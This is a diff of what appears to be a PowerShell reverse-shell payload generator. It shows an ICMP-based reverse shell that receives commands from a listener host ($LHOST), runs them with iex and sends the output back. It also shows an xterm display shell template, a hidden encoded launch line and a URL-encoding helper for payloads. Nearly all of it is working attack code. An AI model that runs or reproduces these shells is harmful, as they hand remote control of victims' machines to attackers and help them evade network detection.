@@ -274,7 +274,7 @@ $r_xterm = @"
 xterm -display $Lhost":"$Lport
 "@
 $r_PowershellICMP = @"
-powershell.exe -c "`$ip='$LHOST'; `$ic=New-Object System.Net.NetworkInformation.Ping; `$po=New-Object System.Net.NetworkInformation.PingOptions; `$po.DontFragment=`$true; function f(`$b) { `$ic.Send(`$ip,60000,([text.encoding]::ASCII).GetBytes(`$b),`$po) }; `$p = -join('PS ',(gl).path,'> '); f(`$p); while (`$true) { `$r = f(''); if (!`$r.Buffer) { continue }; `$rs=([text.encoding]::ASCII).GetString(`$r.Buffer); if (`$rs.StartsWith('EXIT')) { exit }; if (`$rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('C:\Temp\z',`$rs.Substring(7)); f('.'); } else { try { `$rt=(iex -Command `$rs | Out-String); } catch { f(`$_) }; `$i=0; while (`$i -lt `$rt.length-120) { f(`$rt.Substring(`$i,120)); `$i -= -120; }; f(`$rt.Substring(`$i)); `$p = -join('PS ',(gl).path,'> '); f(`$p); }; }"
+powershell.exe -c "`$ip='$LHOST'; `$ic=New-Object System.Net.NetworkInformation.Ping; `$po=New-Object System.Net.NetworkInformation.PingOptions; `$po.DontFragment=`$true; function f(`$b) { `$ic.Send(`$ip,60000,([text.encoding]::ASCII).GetBytes(`$b),`$po) }; `$p = -join('PS ',(gl).path,'> '); f(`$p); while (`$true) { `$r = f(''); if (!`$r.Buffer) { continue }; `$rs=([text.encoding]::ASCII).GetString(`$r.Buffer); if (`$rs.StartsWith('EXIT')) { exit }; if (`$rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('$env:Temp\a',`$rs.Substring(7)); f('.'); } else { try { `$rt=(iex -Command `$rs | Out-String); } catch { f(`$_) }; `$i=0; while (`$i -lt `$rt.length-120) { f(`$rt.Substring(`$i,120)); `$i -= -120; }; f(`$rt.Substring(`$i)); `$p = -join('PS ',(gl).path,'> '); f(`$p); }; }"
 "@
 
 $r_PowershellTCP = @"
@@ -296,7 +296,7 @@ write-host "powershell.exe+-win+hidden+-enc+$EncodedText"
 }
 
 function encodedurl {param($script)
-$script -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" -replace "\(","%28" -replace "\)","%29" -replace "\{","%7B" -replace "\}","%7D";$total = $script.Length - 3; $script = $script.Substring(0,$total)
+$script -replace "\!","%21" -replace " ","%20" -replace "\$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "\(","%28" -replace "\)","%29" -replace "\{","%7B" -replace "\}","%7D" -replace "\|","%7C" -replace "\>","%3E" -replace "\\","%5C";$total = $script.Length - 3; $script = $script.Substring(0,$total)
 
 }
 
